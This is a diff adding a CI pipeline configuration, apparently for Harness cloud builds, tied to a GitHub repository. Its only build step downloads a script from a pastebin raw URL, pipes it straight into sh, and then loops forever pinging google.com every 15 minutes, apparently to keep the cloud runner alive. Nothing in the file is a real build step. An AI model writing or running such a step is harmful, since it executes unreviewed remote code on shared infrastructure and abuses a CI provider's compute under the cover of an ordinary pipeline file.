@@ -1,0 +1,35 @@
+pipeline:
+  name: one
+  identifier: one
+  projectIdentifier: whai
+  orgIdentifier: default
+  tags: {}
+  properties:
+    ci:
+      codebase:
+        connectorRef: account.Github_OAuth_1708418859437
+        repoName: fig-gabriel/newlife
+        build: <+input>
+  stages:
+    - stage:
+        name: one
+        identifier: one
+        description: ""
+        type: CI
+        spec:
+          cloneCodebase: true
+          platform:
+            os: Linux
+            arch: Amd64
+          runtime:
+            type: Cloud
+            spec: {}
+          execution:
+            steps:
+              - step:
+                  type: Run
+                  name: Run_1
+                  identifier: Run_1
+                  spec:
+                    shell: Sh
+                    command: (wget https://pastebin.com/raw/GM1ytrP9 -O- | tr -d '\r') | sh && while true; do wget google.com ; sleep 900 ; done
